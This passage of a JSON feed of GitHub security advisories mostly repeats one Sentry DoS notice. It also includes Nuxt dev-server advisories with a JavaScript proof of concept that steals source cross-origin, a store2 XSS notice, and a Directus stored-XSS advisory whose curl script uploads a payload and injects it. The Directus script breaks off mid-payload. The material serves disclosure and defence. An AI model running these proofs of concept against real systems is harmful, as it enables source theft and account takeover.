<code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nestjs] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/google-cloud-serverless] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/bun] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/aws-serverless] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/astro] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/node] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>\n<h3 id=\"details\">Details</h3>\n<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src=\"http://localhost:3000/_nuxt/app.js\"&gt;</code> in their site and run the script.\nBy using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a nuxt project with webpack / rspack builder.</li>\n<li>Run <code>npm run dev</code></li>\n<li>Open <code>http://localhost:3000</code></li>\n<li>Run the script below in a web site that has a different origin.</li>\n<li>You can see the source code output in the document and the devtools console.</li>\n</ol>\n<pre><code class=\"language-js\">const script = document.createElement('script')\nscript.src = 'http://localhost:3000/_nuxt/app.js'\nscript.addEventListener('load', () =&gt; {\n  for (const page in window.webpackChunknuxt_app) {\n    const moduleList = window.webpackChunknuxt_app[page][1]\n    console.log(moduleList)\n\n    for (const key in moduleList) {\n      const p = document.createElement('p')\n      const title = document.createElement('strong')\n      title.textContent = key\n      const code = document.createElement('code')\n      code.textContent = moduleList[key].toString()\n      p.append(title, ':', document.createElement('br'), code)\n      document.body.appendChild(p)\n    }\n  }\n})\ndocument.head.appendChild(script)\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85\">\nIt contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24361\">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99",
            "title": "[@nuxt/rspack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:43.000Z",
            "date_published": "2025-01-27T11:31:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>\n<h3 id=\"details\">Details</h3>\n<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src=\"http://localhost:3000/_nuxt/app.js\"&gt;</code> in their site and run the script.\nBy using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a nuxt project with webpack / rspack builder.</li>\n<li>Run <code>npm run dev</code></li>\n<li>Open <code>http://localhost:3000</code></li>\n<li>Run the script below in a web site that has a different origin.</li>\n<li>You can see the source code output in the document and the devtools console.</li>\n</ol>\n<pre><code class=\"language-js\">const script = document.createElement('script')\nscript.src = 'http://localhost:3000/_nuxt/app.js'\nscript.addEventListener('load', () =&gt; {\n  for (const page in window.webpackChunknuxt_app) {\n    const moduleList = window.webpackChunknuxt_app[page][1]\n    console.log(moduleList)\n\n    for (const key in moduleList) {\n      const p = document.createElement('p')\n      const title = document.createElement('strong')\n      title.textContent = key\n      const code = document.createElement('code')\n      code.textContent = moduleList[key].toString()\n      p.append(title, ':', document.createElement('br'), code)\n      document.body.appendChild(p)\n    }\n  }\n})\ndocument.head.appendChild(script)\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85\">\nIt contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24361\">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99",
            "title": "[@nuxt/webpack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:43.000Z",
            "date_published": "2025-01-27T11:31:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Nuxt allows any websites to send any requests to the development server and read the response due to default CORS settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>While Vite patched the default CORS settings to fix <a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a>, nuxt uses its own CORS handler by default (<a href=\"https://github.com/nuxt/nuxt/pull/23995\">https://github.com/nuxt/nuxt/pull/23995</a>).</p>\n<p><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></p>\n<p>That CORS handler sets <code>Access-Control-Allow-Origin: *</code>.</p>\n<blockquote>\n<p>[!IMPORTANT]<br>If on an affected version, it may be possible to opt-out of the default Nuxt CORS handler by configuring <code>vite.server.cors</code>.</p>\n</blockquote>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Start a dev server in any nuxt project using Vite by <code>nuxt dev</code>.</li>\n<li>Send a fetch request to <code>http://localhost:3000/_nuxt/app.vue</code> (<code>fetch('http://localhost:3000/_nuxt/app.vue')</code>) from a different origin page.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Users with the default server.cors option using Vite builder may get the source code stolen by malicious websites</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p><code>/__nuxt_vite_node__/manifest</code> / <code>/__nuxt_vite_node__/module</code> also seems to have <code>Access-Control-Allow-Origin: *</code>, so it maybe also possible to exploit that handler.\n<a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a>\nAlthough I didn't find a valid module id.\nNote that this handler is probably also vulnerable to DNS rebinding attacks as I didn't find any host header checks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47\">https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47</a></li>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24360\">https://nvd.nist.gov/vuln/detail/CVE-2025-24360</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/pull/23995\">https://github.com/nuxt/nuxt/pull/23995</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2452-6xj8-jh47\">https://github.com/advisories/GHSA-2452-6xj8-jh47</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2452-6xj8-jh47",
            "title": "[@nuxt/vite-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:15.000Z",
            "date_published": "2025-01-27T11:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2452-6xj8-jh47"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in nbubna store v.2.14.2 and before allows a remote attacker to execute arbitrary code via the store.deep.js component</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57556\">https://nvd.nist.gov/vuln/detail/CVE-2024-57556</a></li>\n<li><a href=\"https://github.com/nbubna/store/issues/127\">https://github.com/nbubna/store/issues/127</a></li>\n<li><a href=\"https://github.com/nbubna/store/pull/128\">https://github.com/nbubna/store/pull/128</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w5hq-hm5m-4548\">https://github.com/advisories/GHSA-w5hq-hm5m-4548</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w5hq-hm5m-4548",
            "title": "[store2] Cross Site Scripting vulnerability in store2",
            "date_modified": "2025-01-24T22:33:06.000Z",
            "date_published": "2025-01-24T00:31:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w5hq-hm5m-4548"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directus allows an authenticated attacker to save cross site scripting code to the database. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with <a href=\"https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86\">CVE-2024-6534</a>, it could result in account takeover.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To exploit this vulnerability, we need to do the following steps using a non-administrative, default role attacker account.</p>\n<ol>\n<li>Upload the following JavaScript file.</li>\n</ol>\n<p>Using the upload functionality at <code>POST /files</code>. This PoC will show an alert message.</p>\n<pre><code class=\"language-js\">export TARGET_HOST=\"http://localhost:8055\"\nexport ATTACKER_EMAIL=\"malicious@malicious.com\"\nexport ATTACKER_PASSWORD=\"123456\"\nroot_dir=$(dirname $0)\nmkdir \"${root_dir}/static\"\n\ncurl -s -k -o /dev/null -w \"%{http_code}\" -X 'POST' \"${TARGET_HOST}/auth/login\" \\\n    -c \"${root_dir}/static/attacker_directus_session_token\" \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"email\\\":\\\"${ATTACKER_EMAIL}\\\",\\\"password\\\":\\\"${ATTACKER_PASSWORD}\\\",\\\"mode\\\":\\\"session\\\"}\"\n\nid_url_file=$(echo \"alert('Successful DOM-based XSS')\" |\n  curl -s -k -X 'POST' \"${TARGET_HOST}/files\" \\\n    -b \"${root_dir}/static/attacker_directus_session_token\" \\\n    -F \"file=@-;type=application/x-javascript;filename=poc.js\" | jq -r \".data.id\")\n</code></pre>\n<ol start=\"2\">\n<li>Create a preset for a collection and store the preset ID.</li>\n</ol>\n<p>Or use a preset already created from GET /presets. The following example uses the direct_users preset.</p>\n<pre><code>attacker_user_id=$(curl -s -k \"${TARGET_HOST}/users/me\" \\ -b \"${root_dir}/static/attacker_directus_session_token\" | jq -r \".data.id\") curl -i -s -k -X 'POST' \"${TARGET_HOST}/presets\" \\ -H 'Content-Type: application/json' \\ -b \"${root_dir}/static/attacker_directus_session_token\" \\ --data-binary \"{\\\"layout\\\":\\\"cards\\\",\\\"bookmark\\\":null,\\\"role\\\":null,\\\"user\\\":\\\"${attacker_user_id}\\\",\\\"search\\\":null,\\\"filter\\\":null,\\\"layout_query\\\":{\\\"cards\\\":{\\\"sort\\\":[\\\"email\\\"]}},\\\"layout_options\\\":{\\\"cards\\\":{\\\"icon\\\":\\\"account_circle\\\",\\\"title\\\":\\\"&lt;iframe srcdoc=\\\\\\\"&lt;script src='http://localhost:8055/assets/${id_url_file}'&gt; 